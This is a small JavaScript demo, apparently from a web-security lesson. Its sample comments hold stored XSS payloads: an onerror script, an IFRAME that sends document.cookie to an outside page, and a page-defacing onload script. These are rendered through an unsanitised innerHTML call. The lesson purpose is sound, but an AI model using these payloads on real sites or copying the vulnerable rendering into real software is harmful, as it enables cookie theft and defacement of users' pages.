var users = {
  14587: {
    name: 'Ivan',
    email: 'ivan78@gmail.com'
  },
  28419: {
    name: 'Georg',
    email: 'georg.klep@gmail.com'
  },
  41457: {
    name: 'Stephan',
    email: 'stephan.borg@gmail.com'
  }
}
var posts = {
  7891451: {
    author: 14587,
    text: `Imagine we can encapsulate these secondary responsibilities in functions /  
           The static String.fromCharCode() method returns a string created 
           from the specified sequence of UTF-16 code units`
  },
  7891452: {
    author: 28419,
    text: `There is no JavaScript property or object named TypedArray, but properties and methods can be used with typed array objects.`
  },
  7891453: {
    author: 28419,
    text: `Typed arrays are not arrays.
           isArray() on a typed array returns false.
           Many array methods (like push and pop) are not supported by typed arrays.
           Typed arrays are array-like objects for storing binary data in memory.`
  },
  7891454: {
    author: 14587,
    text: `The difference between an Uint8Array and an Uint8ClampedArray is how values are added.
           If you set one element in an Uint8ClampedArray to a value outside the 0-255 range, it will default to 0 or 255.
           A typed array will just take the first 8 bits of the value.`
  }
}

var comments = {
  91078454: {
    postId: 7891451,
    author: 28419,
    text: `<IMG SRC=/ onerror="document.write(String.fromCharCode(88,83,83))"></img>`
  },
  91078455: {
    postId: 7891452,
    author: 41457,
    text: `<IFRAME SRC=js/attack.html onmouseover="window.open('https://garevna.github.io/js-samples/js/attack.html#' +  document.cookie, '_self')"></IFRAME>`
  },
  91078457: {
    postId: 7891453,
    author: 41457,
    text: `<img src="https://402.ecma-international.org/10.0/img/ecma-logo.svg" onload="document.write('Looser');document.body.style='background:black;color:red;font-size:50px;font-weight:bold;text-align:center;padding-top:45%;'"/>`
  },
  91078458: {
    postId: 7891454,
    author: 14587,
    text: `The Element.namespaceURI read-only property returns the namespace URI of the element, or null if the element is not in a namespace`
        }
}

function getCurrentPostComments (postId) {
  for (var id in comments) {
    if (comments[id].postId === postId) {
      var comment = document.createElement ('p')
      comment.innerHTML = '<b>' + users[comments[id].author].name + '</b></br>' + comments[id].text
      document.body.appendChild(comment)
    }
  }
}

getCurrentPostComments(7891453)
